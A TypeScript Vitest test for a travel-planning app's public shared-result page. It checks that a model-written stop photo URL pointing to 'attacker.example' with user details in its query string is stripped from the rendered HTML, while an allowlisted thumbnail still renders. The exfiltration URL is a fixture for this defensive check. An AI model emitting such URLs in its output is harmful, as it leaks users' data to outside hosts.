// @vitest-environment jsdom
//
// Gate 2 F-A-pub (TP6) — the public page /r/<slug>, rendered to static HTML through the REAL loader (admin client mocked to return a
// stored old snapshot): the model-written stop photo is not anywhere in the HTML, and a photo allowed by R1 still renders.
import { describe, it, expect, vi } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh_budget200k'
const TBN = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTstop'
const stored = {
  id: 'id-1', slug: 'AbCdEfGh12', query: 'q', domain: 'travel', locale: 'vi', og_version: 1, view_count: 0, ask_count: 0,
  created_at: '2026-10-01T00:00:00.000Z', parent_id: null, owner_is_anonymous: false,
  payload: {
    v: 1, title: 'Đà Lạt 2 ngày', query: 'lên kế hoạch Đà Lạt', domain: 'travel', locale: 'vi', body: 'Kế hoạch.', buttons: [], images: [], suggestedQuestions: [], createdAt: '2026-10-01T00:00:00.000Z',
    plan: { type: 'trip', title: 'Đà Lạt 2 ngày', people: 2, budget_total: '', days: [{ label: 'Ngày 1', items: [
      { time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', description: '', price: '', photo_url: EXFIL },
      { time: '10:00', emoji: '🏞️', category: 'attraction', name: 'Hồ Xuân Hương', description: '', price: '', photo_url: TBN },
    ] }] },
  },
}
vi.mock('@/lib/supabase/admin', () => ({
  createAdminClient: () => {
    const chain = { select: () => chain, eq: () => chain, maybeSingle: async () => ({ data: JSON.parse(JSON.stringify(stored)), error: null }) }
    return { from: () => chain }
  },
}))
vi.mock('./PublicResultClient', () => ({ default: () => null }))
vi.mock('@/components/messaging/NewMessageSheet', () => ({ default: () => null }))
vi.mock('@/lib/share/renderCardImage', () => ({ renderArtifactImage: async () => null }))

import SharedResultPage from './page'

describe('F-A-pub · /r/<slug> HTML (TP6)', () => {
  it('carries no trace of the unlisted stop photo; the R1-allowed photo renders; both stops render', async () => {
    const html = renderToStaticMarkup(await SharedResultPage({ params: { slug: 'AbCdEfGh12' } }))
    expect(html).not.toContain('attacker.example')
    expect(html).toContain(`src="${TBN.replace(/&/g, '&amp;')}"`)
    expect(html).toContain('Quán A')
    expect(html).toContain('Hồ Xuân Hương')
  })
})
